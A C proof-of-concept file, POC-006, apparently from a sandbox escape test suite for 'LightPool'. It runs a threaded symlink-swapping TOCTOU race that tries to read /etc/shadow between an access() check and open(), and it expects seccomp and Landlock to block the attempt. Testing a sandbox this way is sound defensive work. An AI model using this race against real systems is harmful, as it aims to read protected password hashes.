/*
 * POC-006: TOCTOU 竞争条件逃逸
 *
 * 攻击技术：Time-of-check to time-of-use (TOCTOU) 竞争条件
 * 尝试在安全检查（access()）和实际操作（open()）之间替换文件路径，
 * 绕过路径验证访问敏感文件。
 *
 * 预期行为：
 * - seccomp 拦截 openat 对敏感路径的访问
 * - Landlock 限制文件系统访问范围
 * - 进程被 KILL 或操作被拒绝
 * - 审计日志记录竞争条件尝试
 *
 * 风险等级：High
 * 攻击面：LightPool 文件系统隔离
 * 参考：CWE-367 (TOCTOU Race Condition)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>

#define TARGET_PATH "/tmp/safe_file.txt"
#define EVIL_PATH "/etc/shadow"
#define SYMLINK_PATH "/tmp/attack_link"
#define ITERATIONS 10000

static volatile int attack_success = 0;
static volatile int stop_attack = 0;

/* 攻击线程：不断在安全文件和敏感文件之间切换符号链接 */
static void *attacker_thread(void *arg) {
    (void)arg;
    int iteration = 0;

    while (!stop_attack && iteration < ITERATIONS) {
        /* 切换到敏感文件 */
        unlink(SYMLINK_PATH);
        if (symlink(EVIL_PATH, SYMLINK_PATH) == 0) {
            /* 短暂窗口：符号链接指向敏感文件 */
            usleep(1);
        }

        /* 切换回安全文件 */
        unlink(SYMLINK_PATH);
        if (symlink(TARGET_PATH, SYMLINK_PATH) == 0) {
            usleep(1);
        }

        iteration++;
    }

    return NULL;
}

/* 检查线程：模拟安全检查后打开文件 */
static void *checker_thread(void *arg) {
    (void)arg;
    int iteration = 0;

    while (!stop_attack && iteration < ITERATIONS) {
        int fd;

        /* 1. 安全检查：验证路径是否可访问 */
        if (access(SYMLINK_PATH, R_OK) != 0) {
            iteration++;
            continue;
        }

        /* 2. 实际操作：打开文件（TOCTOU 窗口） */
        fd = open(SYMLINK_PATH, O_RDONLY | O_NOFOLLOW);
        if (fd >= 0) {
            char buf[256];
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = '\0';
                /* 检查是否读到了敏感内容 */
                if (strstr(buf, "root:") != NULL || strstr(buf, "$6$") != NULL) {
                    attack_success = 1;
                    fprintf(stderr, "[!] TOCTOU 攻击成功！读取到敏感文件内容\n");
                }
            }
            close(fd);
        }

        iteration++;
    }

    return NULL;
}

int main(void) {
    pthread_t attacker, checker;
    int ret;

    printf("[*] POC-006: TOCTOU 竞争条件逃逸测试\n");
    printf("[*] 目标：在 access() 检查和 open() 操作之间切换符号链接\n");
    printf("[*] 迭代次数：%d\n", ITERATIONS);

    /* 创建安全文件 */
    int safe_fd = open(TARGET_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (safe_fd >= 0) {
        write(safe_fd, "safe content\n", 13);
        close(safe_fd);
    }

    /* 创建初始符号链接（指向安全文件） */
    unlink(SYMLINK_PATH);
    symlink(TARGET_PATH, SYMLINK_PATH);

    /* 启动攻击线程和检查线程 */
    ret = pthread_create(&attacker, NULL, attacker_thread, NULL);
    if (ret != 0) {
        fprintf(stderr, "[-] 无法创建攻击线程: %s\n", strerror(ret));
        return 1;
    }

    ret = pthread_create(&checker, NULL, checker_thread, NULL);
    if (ret != 0) {
        fprintf(stderr, "[-] 无法创建检查线程: %s\n", strerror(ret));
        stop_attack = 1;
        pthread_join(attacker, NULL);
        return 1;
    }

    /* 等待线程完成 */
    pthread_join(checker, NULL);
    stop_attack = 1;
    pthread_join(attacker, NULL);

    /* 清理 */
    unlink(SYMLINK_PATH);
    unlink(TARGET_PATH);

    if (attack_success) {
        printf("[!] 结果：攻击成功（沙盒逃逸漏洞！）\n");
        return 2;
    } else {
        printf("[+] 结果：攻击被阻止（TOCTOU 竞争条件未成功）\n");
        return 0;
    }
}
